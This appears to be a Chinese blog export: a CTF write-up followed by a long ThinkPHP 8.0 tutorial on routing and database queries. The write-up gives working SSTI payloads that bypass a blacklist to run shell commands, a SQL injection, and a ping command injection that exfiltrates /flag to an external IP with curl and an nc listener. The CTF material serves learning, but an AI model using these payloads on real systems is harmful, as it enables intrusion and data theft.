can_u_find_meblacklist = [&#x27;_&#x27;, &#x27;[&#x27;, &#x27;globals&#x27;, &#x27;url_for&#x27;, &#x27;count&#x27;, &#x27;length&#x27;, &#x27;init&#x27;, &#x27;request&#x27;, &#x27;builtins&#x27;, &#x27;select&#x27;, &#x27;dict&#x27;, &#x27;(&#x27;,&#x27;join&#x27;, &#x27;import&#x27;, &#x27;os&#x27;, &#x27;&#123;&#x27;, &#x27;open&#x27;, &#x27;eval&#x27;, &#x27;set&#x27;, &#x27;%&#x27;, &#x27;for&#x27;, &#x27;class&#x27;, &#x27;\&#x27;&#x27;, &#x27;\&quot;&#x27;, &#x27;chr&#x27;, &#x27;attr&#x27;, &#x27;|&#x27;]def waf(s):    for i in blacklist:        if i in s.split(&#x27;/&#x27;)[-1]:            return s + &#x27;?hacker&#x27;    return render_template_string(s)@app.errorhandler(404)def page_not_found(e):    url = waf(request.url)    return render_template(&#x27;404.html&#x27;, error_page=url), 404

上面黑名单中把所有有可能的ssti操作全部过滤掉了，但是我们可以看到函数waf的定义，它只检测url中的最后一个/后面的内容，所以我们可以向url中多输入几个，比如：/&#123;&#123;7*7&#125;&#125;/a，可以发现成功执行ssti的相关代码，然后我们就可以直接进行无任何waf的ssti操作了，但是要注意这里的话不能直接输入空格，可以用$&#123;IFS&#125;来进行代替
输入/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;/a，得到所有的子类，找到我们需要的（当然也可以用脚本来执行）
接着/&#123;&#123;[].__class__.__base__.__subclasses__()[519]('ls$&#123;IFS&#125;/',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;/a爆出根目录下的所有文件
/&#123;&#123;[].__class__.__base__.__subclasses__()[519]('cat$&#123;IFS&#125;/flag',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;/a得到flag
最后成功得到flag
EatPotato!首先利用题目给我们提供的网站（https://xcheck.tencent.com/index）来分析一下哪里有漏洞

于是我们到源码文件夹中去找寻这行代码，如下：
$score_sql = &quot;SELECT `score`,`time`,`attempts` FROM &quot; . $ranking . &quot; where name=&#x27;&quot; . $_SESSION[&#x27;name&#x27;] . &quot;&#x27;&quot;;            $score_result = $link-&gt;query($score_sql);

这⾥有两处拼接， $ranking 变量和 $_SESSION[&#39;name&#39;] 变量，利⽤phpstorm的跟进快捷键 (Ctrl+b)，我们可以看到ranking变量实际上是定值，再查看name变量，得到以下结果：
if (isset($_GET[&#x27;name&#x27;])) &#123;  $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;

先注册一个账号，然后打个游戏，后面去查看排行榜，发现url为http://localhost:20010/rank.php?name=sherlock，开始尝试注入，单引号包裹，报错注入，得到flag
被你们玩坏了的ping这一题没有回显数据，所以我们可以采用外带数据的方法或者将文件内容写入静态目录进行查看的办法
第一种为外带
首先监听端口：nc -lvnp 7890
然后在题目提供的框框中输入：
curl http://124.70.99.199:7890/?a=`cat /flag | base64`

然后查看监听的内容
第二种方法就是写入静态目录
cat /flag &gt; static/res.txt，然后直接访问/static/res.txt即可得到flag
PTA-max]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>thinkphp学习</title>
    <url>/2024/07/14/thinkphp%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[引用thinkPHP8.0安装与避坑
ThinPHP官方手册
安装thinphp8.0&lt;!--1、访问网址下载安装composer--&gt;https://getcomposer.org/Composer-Setup.exe&lt;!--2、配置镜像源防止乱七八糟的网络和GitHub仓库拉取无权限问题--&gt;composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/&lt;!--3、在网站根目录(www)下进入cmd创建项目--&gt;composer create-project topthink/think tpcd tp&lt;!--4、解决依赖项报错--&gt;composer up --ignore-platform-reqs&lt;!--5、运行命令查看效果--&gt;php think run&lt;!--6、访问查看结果，这里有坑：不能直接访问0.0.0.0:8000这个地址--&gt;127.0.0.1:8000

在第三步创建tk项目时候有报错是正常的，因为有依赖项无法安装的问题(我安装时候的PHP解释器版本是8.2.9)，所以需要切换到tk项目目录下执行命令解决依赖项无法安装的问题
基础目录结构单应用模式默认安装后的目录结构就是单应用目录结构
www  WEB部署目录（或者子目录）├─app           应用目录│  ├─controller      控制器目录│  ├─model           模型目录│  ├─ ...            更多类库目录│  ││  ├─common.php         公共函数文件│  └─event.php          事件定义文件│├─config                配置目录│  ├─app.php            应用配置│  ├─cache.php          缓存配置│  ├─console.php        控制台配置│  ├─cookie.php         Cookie配置│  ├─database.php       数据库配置│  ├─filesystem.php     文件磁盘配置│  ├─lang.php           多语言配置│  ├─log.php            日志配置│  ├─middleware.php     中间件配置│  ├─route.php          URL和路由配置│  ├─session.php        Session配置│  ├─trace.php          Trace配置│  └─view.php           视图配置│├─view            视图目录├─route                 路由定义目录│  ├─route.php          路由定义文件│  └─ ...   │├─public                WEB目录（对外访问目录）│  ├─index.php          入口文件│  ├─router.php         快速测试文件│  └─.htaccess          用于apache的重写│├─extend                扩展类库目录├─runtime               应用的运行时目录（可写，可定制）├─vendor                Composer类库目录├─.example.env          环境变量示例文件├─composer.json         composer 定义文件├─LICENSE.txt           授权说明文件├─README.md             README 文件├─think                 命令行入口文件

多应用模式详见官方手册
默认应用文件默认安装后，app目录下会包含下面的文件。
├─app           应用目录│  ││  ├─BaseController.php    默认基础控制器类│  ├─ExceptionHandle.php   应用异常定义文件│  ├─common.php            全局公共函数文件│  ├─middleware.php        全局中间件定义文件│  ├─provider.php          服务提供定义文件│  ├─Request.php           应用请求对象│  └─event.php             全局事件定义文件

BaseController.php、Request.php 和ExceptionHandle.php三个文件是系统默认提供的基础文件，位置你可以随意移动，但注意要同步调整类的命名空间。如果你不需要使用Request.php 和ExceptionHandle.php文件，或者要调整类名，记得必须同步调整provider.php文件中的容器对象绑定。
配置
默认情况下，程序出错会显示：页面出错！请稍候再试~
这种情况，一般是应用部署好后，万一出错给用户看的；
如果我们自己在开发阶段，需要开启调试模式，来提示具体的错误信息：
在根目录有一个文件：.example.env，改成 .env ，也就是去掉点前面；（环境变量文件）
然后在配置信息的第一行：APP_DEBUG &#x3D; true 即可，false则不开启。



开启后会如下所示：


调试模式开启后，可以发现右下角会出现trace调试工具小图标：
包含了丰富的调试内容：具体自点查看。



架构HTTP请求流程对于一个HTTP应用来说，从用户发起请求到响应输出结束，大致的标准请求流程如下：

载入Composer的自动加载autoload文件
实例化系统应用基础类think\App
获取应用目录等相关路径信息
加载全局的服务提供provider.php文件
设置容器实例及应用对象实例，确保当前容器对象唯一
从容器中获取HTTP应用类think\Http
执行HTTP应用类的run方法启动一个HTTP应用
获取当前请求对象实例（默认为 app\Request 继承think\Request）保存到容器
执行think\App类的初始化方法initialize
加载环境变量文件.env和全局初始化文件
加载全局公共文件、系统助手函数、全局配置文件、全局事件定义和全局服务定义
判断应用模式（调试或者部署模式）
监听AppInit事件
注册异常处理
服务注册
启动注册的服务
加载全局中间件定义
监听HttpRun事件
执行全局中间件
执行路由调度（Route类dispatch方法）
如果开启路由则检查路由缓存
加载路由定义
监听RouteLoaded事件
如果开启注解路由则检测注解路由
路由检测（中间流程很复杂 略）
路由调度对象think\route\Dispatch初始化
设置当前请求的控制器和操作名
注册路由中间件
绑定数据模型
设置路由额外参数
执行数据自动验证
执行路由调度子类的exec方法返回响应think\Response对象
获取当前请求的控制器对象实例
利用反射机制注册控制器中间件
执行控制器方法以及前后置中间件
执行当前响应对象的send方法输出
执行HTTP应用对象的end方法善后
监听HttpEnd事件
执行中间件的end回调
写入当前请求的日志信息

入口文件ThinkPHP8.0采用单一入口模式进行项目部署和访问，一个应用都有一个统一（但不一定是唯一）的入口。如果采用自动多应用部署的话，一个入口文件还可以自动对应多个应用。
应用入口文件默认的应用入口文件位于public/index.php，如果你没有特殊的自定义需求，无需对入口文件做任何的更改。入口文件位置的设计是为了让应用部署更安全，请尽量遵循public目录为唯一的web可访问目录，其他的文件都可以放到非WEB访问目录下面
控制台入口文件除了应用入口文件外，系统还提供了一个控制台入口文件（即位于项目根目录的think文件）
控制台入口文件用于执行控制台指令，例如：
php think version

系统内置了一些常用的控制台指令，如果你安装了额外的扩展，也会增加相应的控制台指令，都是通过该入口文件执行的。
多应用模式详见官方手册
URL访问单应用URLhttp://serverName/index.php/控制器/操作/参数/值…


注意：这里服务器启动是 php think run 的内置服务器，下节课会探讨外置服务器；

结构分析：

serverName就是我们的：127.0.0.1:8000；

index.php 是入口文件，带上 / ；

控制器是app\controller\Index.php中的 Index 这个名称，也就是类名；

操作是类里面的方法名，比如：index（默认方法），hello（普通方法）；

默认方法可以省略，会直接方法，其他普通方法需要键入方法名：

http://127.0.0.1:8000/index.php/Index (默认执行index操作)
http://127.0.0.1:8000/index.php/Index/index (完整路径)
http://127.0.0.1:8000/index.php/Index/test (普通方法，必须完整路径)


系统默认自带的hello方法，是针对后续路由的，在路由文件设置过导致无效；

我们在config&#x2F;app.php中将路由关闭：&quot;with_route&quot;  =&gt; false,

http://127.0.0.1:8000/index.php/Index/hello （执行默认参数值）
http://127.0.0.1:8000/index.php/Index/hello/name/World（修改参数值）


参数不够直观，尤其多参数的时候，也是支持传统方案的：

http://127.0.0.1:8000/index.php/Index/hello?name=World （问号键值对）





URL重写可以通过URL重写隐藏应用的入口文件index.php（也可以是其它的入口文件，但URL重写通常只能设置一个入口文件）,下面是相关服务器的配置参考：
[ Apache ]
httpd.conf配置文件中加载了mod_rewrite.so模块
AllowOverride None 将None改为 All
把下面的内容保存为.htaccess文件放到应用入口文件的同级目录下

&lt;IfModule mod_rewrite.c&gt;  Options +FollowSymlinks -Multiviews  RewriteEngine On  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f  RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]&lt;/IfModule&gt;

[ Nginx ]在Nginx低版本中，是不支持PATHINFO的，但是可以通过在Nginx.conf中配置转发规则实现：
location / &#123; // …..省略部分代码   if (!-f $request_filename) &#123;   		rewrite  ^(.*)$  /index.php?s=/$1  last;    &#125;&#125;

其实内部是转发到了ThinkPHP提供的兼容URL，利用这种方式，可以解决其他不支持PATHINFO的WEB服务器环境。
外置服务器，比如phpEnv，省略了入口文件，则出现如下问题：

查看手册，根据它URL重写的修改方案（Apache），需要修改.htaccess最后一行：
#RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]  Apache替换成下面一行RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]

控制器定义
控制器：顾名思义MVC中的C，即逻辑控制定义；

默认在app\controller下编写对应的控制器类文件，如果想改默认目录，在&#x2F;config&#x2F;route.php中进行修改：
// 访问控制器层名称&quot;controller_layer&quot;      =&gt; &quot;controller&quot;,

类名和文件名大小写保持一致，并采用驼峰式（首字母大写）；
&lt;?phpnamespace app\controller;class User&#123;    public function index()&#123;        return &quot;用户！&quot;;    &#125;    public function login($name = &#x27;city&#x27;)&#123;        return &quot;登陆成功！&quot;.$name;    &#125;&#125;



User类创建两个方法 index(默认)和 login，访问 URL 如下：
http://127.0.0.1:8000/index.php/user/
http://127.0.0.1:8000/index.php/user/login
http://127.0.0.1:8000/index.php/User/login?name = Mancity


那么如果创建的是双字母组合，比如 class HelloWorld，访问 URL 如下：

http://127.0.0.1:8000/Index.php/helloworld

http://127.0.0.1:8000/Index.php/Hello_World
&lt;?phpnamespace app\controller;class HelloWorld&#123;    public function index()&#123;        return &quot;Hello world!&quot;;    &#125;&#125;

基础和空控制器基础控制器
一般来说，创建控制器后，推荐继承基础控制器来获得更多的功能方法；

基础控制器仅仅提供了控制器验证功能，并注入了think\App和think\Request；
namespace app\controller;use app\BaseController;class User extends BaseController&#123;    public function index()    &#123;        // 返回实际路径        return $this-&gt;app-&gt;getBasePath();        // 返回当前方法名        return $this-&gt;request-&gt;action();    &#125;&#125;

空控制器
空控制器一般用于载入不存在的控制器时，进行错误提示；
class Error&#123;    public function __call(string $name, array $arguments)    &#123;        return &quot;当前控制器不存在！&quot;;    &#125;&#125;

数据库创建数据库及表我这边使用navicat软件配合phpstudy进行创建的，这边我就不详细说明了
连接数据库和查询连接数据库
我们可以在 config\database.php 配置文件中设置与数据库的连接信息：

如果是一般性数据库连接，在 ‘’connections‘’ 配置区设置即可；

如果是本地测试，它会优先读取 .env 配置，然后再读取 database.php 的配置；
# .env文件，部署服务器，请禁用我APP_DEBUG = trueDB_TYPE = mysqlDB_HOST = 127.0.0.1DB_NAME = demoDB_USER = rootDB_PASS = 123456DB_PORT = 3306DB_CHARSET = utf8DEFAULT_LANG = zh-cn

如果禁用了 .env 配置，则会读取数据库连接的默认配置：
// 数据库连接配置信息&quot;connections&quot;     =&gt; [    &quot;mysql&quot; =&gt; [        // 数据库类型        &quot;type&quot;            =&gt; env(&quot;DB_TYPE&quot;, &quot;mysql&quot;),        // 服务器地址        &quot;hostname&quot;        =&gt; env(&quot;DB_HOST&quot;, &quot;127.0.0.1&quot;),        // 数据库名        &quot;database&quot;        =&gt; env(&quot;DB_NAME&quot;, &quot;demo&quot;),        // 用户名        &quot;username&quot;        =&gt; env(&quot;DB_USER&quot;, &quot;root&quot;),        // 密码        &quot;password&quot;        =&gt; env(&quot;DB_PASS&quot;, &quot;123456&quot;),        // 端口        &quot;hostport&quot;        =&gt; env(&quot;DB_PORT&quot;, &quot;3306&quot;),



PHP获取数据
我们暂时没有详细学习此类语法，可以简单用一些了解一下即可：
// 引入Db数据库类use think\facade\Db;class User extends BaseController&#123;    public function get()    &#123;        // 连接user表，查询        $user = Db::table(&quot;users&quot;)-&gt;select();        // 输出数据        return json($user);    &#125;&#125;

数据查询table方法
Db类旗下有一个 table 静态调用的方法，参数为完整的表名（前缀都不能省略）；

如果希望只查询一条数据，可以使用 find() 方法，需指定 where 条件：
// 通过ID查询指定的数据// find 方法查询结果不存在，返回 null，否则返回结果数组$user = Db::table(&quot;user&quot;)-&gt;where(&quot;id&quot;, 1)-&gt;find();

想要了解执行的原生SQL是什么，可以注释掉 return 直接通过 trace 查看；

使用 findOrEmpty() 方法也可以查询一条数据，但在没有数据时返回一个空数组：
// 没有数据返回空数组$user = Db::table(&quot;user&quot;)-&gt;where(&quot;id&quot;, 11)-&gt;findOrEmpty();

使用 findOrFail() 方法同样可以查询一条数据，在没有数据时抛出一个异常：
// 没有数据抛出异常$user = Db::table(&quot;user&quot;)-&gt;where(&quot;id&quot;, 11)-&gt;findOrFail();

想要获取多列数据，可以使用 select() 方法：
// 查询所有数据$user = Db::table(&quot;user&quot;)-&gt;select();

select() 方法默认返回 Collection 对象的数据集，可以通过 toArray() 方法转换成数组：
// 用中断函数，来检测返回值$user = Db::table(&quot;user&quot;)-&gt;select();halt($user);// 转换成数组$user = Db::table(&quot;user&quot;)-&gt;select()-&gt;toArray();halt($user);

多列数据也可以参与 where() 方法的筛选：
// 多列筛选$user = Db::table(&quot;user&quot;)-&gt;where(&quot;age&quot;, 14)-&gt;select();

链式查询
我们发现通过指向符号 “-&gt;” 多次连续调用方法称为：链式查询；
当 Db::table(“user”) 时，返回查询对象（Query），即可连缀数据库对应的方法；
当返回查询对象（Query）时，就可以继续调用链式方法，where() 也是链式方法；
而 where() 被调用后，依旧返回（Query），可以再次链式调用；
在手册 数据库 -&gt; 查询构造器 -&gt; 链式操作 可以了解所有可链式的方法：table、where等；
直到遇到 find() 或 select() 返回数组或数据集时，结束查询；

表达式查询
查询表达式支持大部分常用的 SQL 语句，语法格式如下：
where(&quot;字段名&quot;,&quot;查询表达式&quot;,&quot;查询条件&quot;);

所有的表达式，查阅手册 -&gt; 查询表达式 中的表格即可；这里列出几个意思一下：



表达式
含义
快捷方式



&#x3D;
等于



&lt;&#x3D; time
小于等于某个时间
whereTime


EXP
SQL表达式查询
whereExp


[NOT] LIKE
模糊查询
whereLike


[NOT] IN
[非] IN 查询
whereIN




查询示例
条件判断类的，id大于4的；
// 查询id大于4的数据$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 4)-&gt;select();return json($user);

Like模糊查询，姓王的；
// 查询姓王的用户$user = Db::name(&quot;user&quot;)-&gt;where(&quot;name&quot;, &quot;like&quot;, &quot;王%&quot;)-&gt;select();// like快捷方式$user = Db::name(&quot;user&quot;)-&gt;whereLike(&quot;name&quot;, &quot;王%&quot;)-&gt;select();

IN区间查询，根据id；
// 区间查询，支持not in$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;in&quot;, &quot;1, 3, 5&quot;)-&gt;select();// 语义更好一点$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;in&quot;, [1,3,5])-&gt;select();// IN快捷查询，两种均可，支持whereNotIn$user = Db::name(&quot;user&quot;)-&gt;whereIn(&quot;id&quot;, [1, 2, 3])-&gt;select();// Between，和IN一样 支持 not between$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;between&quot;, [2,5])-&gt;select();// 快捷方式和IN一样：whereBetween和whereNotBetween

NULL查询；
// NULL,  null 或 not null：$user = Db::name(&quot;user&quot;)-&gt;where(&quot;details&quot;, &quot;not null&quot;)-&gt;select();// 快捷方式：whereNull和whereNotNull

EXP查询，自定义SQL片段；
// EXP查询，自定义SQL$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;EXP&quot;, &quot;&lt;&gt; 8 and id &gt;5&quot;)-&gt;select();// 快捷查询$user = Db::name(&quot;user&quot;)-&gt;whereExp(&quot;id&quot;,&quot;&lt;&gt; 8 and id &gt;5&quot;)-&gt;select();

表前缀之扩展查询表前缀
一般来说，为了保持表名统一性和防止冲突，都会给表加上一个前缀，以下划线结束；

比如：tp_user，这里的 tp_ 就是表前缀，所有；

我们修改MySQL中表名，然后刷新程序，报错；

当然，你可以传递 **Db::table(“tp_user”)**，但没必要；



首先，我们可以来配置统一前缀：

在 .env 文件中 添加：DB_PREFIX = tp_

如果部署环境 database.php 中 设置
&quot;prefix&quot; =&gt; env(&quot;DB_PREFIX&quot;, &quot;tp_&quot;),


然后，使用 Db::name(“user”) 方法即可：
// 此时，tp_ 表名的前缀可以省略$user = Db::name(&quot;user&quot;)-&gt;select();

扩展查询
通过 value() 方法，可以查询指定字段的值（单个），没有数据返回 null ；
// value() 方法查询单个列值$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 3)-&gt;value(&quot;name&quot;);

通过 colunm() 方法，可以查询指定列的值（多个），没有数据返回空数组；
// colunm() 方法查询多个列值$user = Db::name(&quot;user&quot;)-&gt;column(&quot;name&quot;);// 通过id 作为索引$user = Db::name(&quot;user&quot;)-&gt;column(&quot;name,age&quot;, &quot;id&quot;);

当大量数据需要 批处理 时，比如给所有用户更新数据，就不能一次性全取出来，一批一批的来；
// 批量处理Db::name(&quot;user&quot;)-&gt;chunk(2, function ($users) &#123;    foreach ($users as $user) &#123;        dump($user);    &#125;    echo 1;&#125;);// 通过获取最后的SQL语句，发现用的是LIMIT 2return Db::getLastSql();

另一种处理大量数据：游标查询，为了解决内存开销，每次读取一行，并返回到下一行再读取；
// 批量处理2$users = Db::name(&quot;user&quot;)-&gt;cursor();// PHP生成器// halt($user);foreach ($users as $user) &#123;    dump($user);&#125;

添加数据单条新增
使用 insert() 方法可以向数据表添加一条数据，更多的字段采用默认；
public function add()&#123;    // 数据$data = [    &quot;name&quot;    =&gt; &quot;张麻子&quot;,    &quot;age&quot;     =&gt; 28,    &quot;gender&quot;  =&gt; &quot;男&quot;];// 单条新增，成功返回1return Db::name(&quot;user&quot;)-&gt;insert($data);&#125;

如果想强行新增抛弃不存在的字段数据，则使用 strick(false) 方法，忽略异常；
// 数据$data = [    &quot;name&quot;    =&gt; &quot;马邦德&quot;,    &quot;age&quot;     =&gt; 30,    &quot;gender&quot;  =&gt; &quot;男&quot;,    &quot;deta&quot; =&gt; &quot;我脸上没有麻子！&quot;];// 单条新增，成功返回1return Db::name(&quot;user&quot;)-&gt;strict(false)-&gt;insert($data);

如果我们采用的数据库是 mysql，可以支持 replace 写入；

insert 和 replace insert 写入的区别，前者表示表中存在主键相同则报错，后者则修改；
// 新增数据时，主键冲突时，直接修改这条记录Db::name(&quot;user&quot;)-&gt;replace()-&gt;insert($data);

使用 insertGetId() 方法，可以在新增成功后返回当前数据 ID；
// 返回自增IDreturn Db::name(&quot;user&quot;)-&gt;replace()-&gt;insertGetId($data);

多条新增
使用 insertAll() 方法，可以批量新增数据，但要保持数组结构一致；
// 数据$data = [[    &quot;name&quot;    =&gt; &quot;林克&quot;,    &quot;age&quot;     =&gt; 19,    &quot;gender&quot;  =&gt; &quot;男&quot;,    &quot;details&quot; =&gt; &quot;先收集999个呀哈哈！&quot;],[    &quot;name&quot;    =&gt; &quot;普尔亚&quot;,    &quot;age&quot;     =&gt; 100,    &quot;gender&quot;  =&gt; &quot;女&quot;,    &quot;details&quot; =&gt; &quot;我先来个返老还童，再快速长大！&quot;]];return Db::name(&quot;user&quot;)-&gt;insertAll($data);

insertAll() 方法 也支持 replace 写入，如果添加数据量大，可以通过 -&gt; limit() 方法限制添加数量；
Db::name(&quot;user&quot;)-&gt;replace()-&gt;limit(100)-&gt;insertAll($data);

更新，删除以及save方法数据修改
使用 update() 方法来修改数据，修改成功返回影响行数，没有修改返回 0；
// 修改的数据$data = [    &quot;name&quot; =&gt; &quot;王三狗&quot;,    &quot;age&quot;  =&gt; &quot;13&quot;,];// 执行修改并返回return Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 4)-&gt;update($data);

如果修改数据包含了主键信息，比如 id，那么可以省略掉 where 条件；
// 修改的数据$data = [    &quot;id&quot;   =&gt; 4,    &quot;name&quot; =&gt; &quot;王三狗&quot;,    &quot;age&quot;  =&gt; &quot;13&quot;,];// 执行修改并返回return Db::name(&quot;user&quot;)-&gt;update($data);

如果想让一些字段修改时执行 SQL 函数操作，可以使用 exp() 方法实现；
// 让details字段内的英文大写return Db::name(&quot;user&quot;)-&gt;exp(&quot;details&quot;, &quot;UPPER(details)&quot;)-&gt;update($data);

如果要自增&#x2F;自减某个字段，可以使用 inc&#x2F;dec 方法，并支持自定义步长；
// 修改时，让age自增和自减，默认1，要去掉$data里面age字段的修改，不然冲突return Db::name(&quot;user&quot;)-&gt;inc(&quot;age&quot;)-&gt;dec(&quot;age&quot;, 2)-&gt;update($data);// 派生自字段，延迟执行，毫秒setInc(&quot;age&quot;, 1, 600)setDec(&quot;age&quot;, 2, 600)

使用 Db::raw() 来设置每个字段的特殊需求，灵活且清晰：
// 使用Db::raw 更加清晰灵活Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 4)-&gt;update([    &quot;details&quot;   =&gt;  Db::raw(&quot;UPPER(details)&quot;),    &quot;age&quot;       =&gt;  Db::raw(&quot;age-2&quot;)]);return Db::getLastSql();

save() 方法是一个通用方法，可以自行判断是新增还是修改(更新)数据；
// 包含主键，即修改；否则，新增return Db::name(&quot;user&quot;)-&gt;save($data);

数据删除
极简删除可以根据主键直接删除，删除成功返回影响行数，否则 0；
// 根据主键删除Db::name(&quot;user&quot;)-&gt;delete(8);

根据主键，还可以删除多条记录；
// 根据主键删除多条Db::name(&quot;user&quot;)-&gt;delete([48,49,50]);

正常情况下，通过 where()方法来删除；
// 条件删除Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, 47)-&gt;delete();

其他各种查询方式字符串条件
whereRaw 可以直接写入多条件：
// 多条件字符串$user = Db::name(&quot;user&quot;)-&gt;whereRaw(&quot;age &gt; 15 AND gender=&quot;女&quot;&quot;)-&gt;select();

包含变量的多条件查询：
// 变量$age = 15;$gender = &quot;女&quot;;// 预处理机制$user = Db::name(&quot;user&quot;)-&gt;whereRaw(&quot;age&gt;:age AND gender=:gender&quot;, [    &quot;age&quot;       =&gt; $age,    &quot;gender&quot;    =&gt; $gender])-&gt;select();

field()字段筛选
使用 field() 方法，可以指定要查询的字段；
// 字段筛选$user = Db::name(&quot;user&quot;)-&gt;field(&quot;id, age, gender&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;field([&quot;id, age, gender&quot;])-&gt;select();

使用 field() 方法，给指定的字段设置别名；
// 字段别名$user = Db::name(&quot;user&quot;)-&gt;field(&quot;id, gender as sex&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;field([&quot;id&quot;, &quot;gender&quot;=&gt;&quot;sex&quot;])-&gt;select();

在 fieldRaw() 方法里，可以直接给字段设置 MySQL 函数；
// 直接SQL函数$user = Db::name(&quot;user&quot;)-&gt;fieldRaw(&quot;id, UPPER(details)&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;field(true)-&gt;select();   // 推荐return Db::getLastSql();

使用 withoutField() 方法中字段排除，可以屏蔽掉想要不显示的字段；
// 排除字段$user = Db::name(&quot;user&quot;)-&gt;withoutField(&quot;details&quot;)-&gt;select();

使用 field() 方法在新增时，验证字段的合法性；
// 排除新增字段Db::name(&quot;user&quot;)-&gt;field(&quot;name,age,gender&quot;)-&gt;insert($data);

常用链式方法
使用 alias() 方法，给数据库起一个别名；
// 给数据库起个别名Db::name(&quot;user&quot;)-&gt;alias(&quot;a&quot;)-&gt;select();return Db::getLastSql();// 起别名最主要是和另一张表进行关联，这里看手册好了，没表测试alias(&quot;a&quot;)-&gt;join()

使用 limit() 方法，限制获取输出数据的个数；
// 显示前5条$user = Db::name(&quot;user&quot;)-&gt;limit(5)-&gt;select();

分页模式，即传递两个参数，比如从第 3 条开始显示 5 条 limit(2,5)；
// 从第2个位置，也就是第3条开始，显示5条$user = Db::name(&quot;user&quot;)-&gt;limit(2,5)-&gt;select();// 查询第一页数据，1至10条$user = Db::name(&quot;user&quot;)-&gt;page(1,10)-&gt;select(); 

使用 order() 方法，可以指定排序方式，没有指定第二参数，默认 asc；
// 按id倒序排列$user = Db::name(&quot;user&quot;)-&gt;order(&quot;id&quot;, &quot;desc&quot;)-&gt;select();

支持数组的方式，对多个字段进行排序；
// 按多个字段规则排序$user = Db::name(&quot;user&quot;)-&gt;order([&quot;age&quot;=&gt;&quot;asc&quot;, &quot;id&quot;=&gt;&quot;desc&quot;])-&gt;select();//支持 orderRaw() 方法，可以传入SQL函数，和前面各类Raw一样，不再赘述

使用 group() 方法，给性别不同的人进行 age 字段的总和统计；
// 统计性别的年龄总和$user = Db::name(&quot;user&quot;)-&gt;fieldRaw(&quot;gender, SUM(age)&quot;)                        -&gt;group(&quot;gender&quot;)-&gt;select();

使用 group() 分组之后，再使用 having() 进行筛选；
// 统计性别的年龄总和，筛选大于100的$user = Db::name(&quot;user&quot;)-&gt;fieldRaw(&quot;gender, SUM(age)&quot;)                        -&gt;group(&quot;gender&quot;)                        -&gt;having(&quot;SUM(age) &gt; 100&quot;)-&gt;select();

时间查询
可以使用 &gt;、&lt;、&gt;&#x3D;、&lt;&#x3D; 来筛选匹配时间的数据；
// 传统时间筛选$user = Db::name(&quot;user&quot;)-&gt;where(&quot;create_time&quot;, &quot;&gt;&quot;, &quot;2022-1-1&quot;)-&gt;select();$user = Db::name(&quot;user&quot;)-&gt;where(&quot;create_time&quot;, &quot;between&quot;, [&quot;2020-1-1&quot;, &quot;2023-1-1&quot;])-&gt;select(); 

快捷方式 whereTime：
// 使用快捷方式查询$user = Db::name(&quot;user&quot;)-&gt;whereTime(&quot;create_time&quot;, &quot;&gt;=&quot;, &quot;2022-1-1&quot;)-&gt;select();// 默认是 &gt; 可以省略$user = Db::name(&quot;user&quot;)-&gt;whereTime(&quot;create_time&quot;, &quot;2022-1-1&quot;)-&gt;select();

区间查询快捷方式 whereBetweenTime：
// 区间查询，包含 whereNotBetweenTime$user = Db::name(&quot;user&quot;)-&gt;whereBetweenTime(&quot;create_time&quot;, &quot;2020-1-1&quot;, &quot;2023-1-1&quot;)-&gt;select();

使用 whereYear 查询今年的数据、去年的数据和某一年的数据；
// 查询今年$user = Db::name(&quot;user&quot;)-&gt;whereYear(&quot;create_time&quot;)-&gt;select();// 查询去年$user = Db::name(&quot;user&quot;)-&gt;whereYear(&quot;create_time&quot;, &quot;last year&quot;)-&gt;select();// 查询某一年$user = Db::name(&quot;user&quot;)-&gt;whereYear(&quot;create_time&quot;, &quot;2019&quot;)-&gt;select();

使用 whereMonth 查询当月的数据、上月的数据和某一个月的数据；
Db::name(&quot;user&quot;)-&gt;whereMonth(&quot;create_time&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereMonth(&quot;create_time&quot;, &quot;last month&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereMonth(&quot;create_time&quot;, &quot;2020-6&quot;)-&gt;select();

使用 whereDay 查询今天的数据、昨天的数据和某一个天的数据；
Db::name(&quot;user&quot;)-&gt;whereDay(&quot;create_time&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereDay(&quot;create_time&quot;, &quot;last day&quot;)-&gt;select();Db::name(&quot;user&quot;)-&gt;whereDay(&quot;create_time&quot;, &quot;2020-6-27&quot;)-&gt;select();

查询指定时间的数据，比如两小时内的；
// 两小时内的$user = Db::name(&quot;user&quot;)-&gt;whereTime(&quot;create_time&quot;, &quot;-2 hours&quot;)-&gt;select();

查询两个时间字段时间有效期的数据，比如活动开始到结束的期间；

比如创建两个字段：start_time，end_time，注册后，分别写入对应时间表明它的有效期；
// 直接这么写，不太好理解，看手册的另一种普通写法很容易理解// 实战中，字段丰富的时候再演示$user = Db::name(&quot;user&quot;)-&gt;whereBetweenTimeField(&quot;start_time&quot;, &quot;end_time&quot;)-&gt;select();

聚合查询
使用 count() 方法，可以求出所查询数据的数量；
// 获取记录数$user = Db::name(&quot;user&quot;)-&gt;count();

count() 可设置指定 id，比如有空值(Null)的 details，不会计算数量；
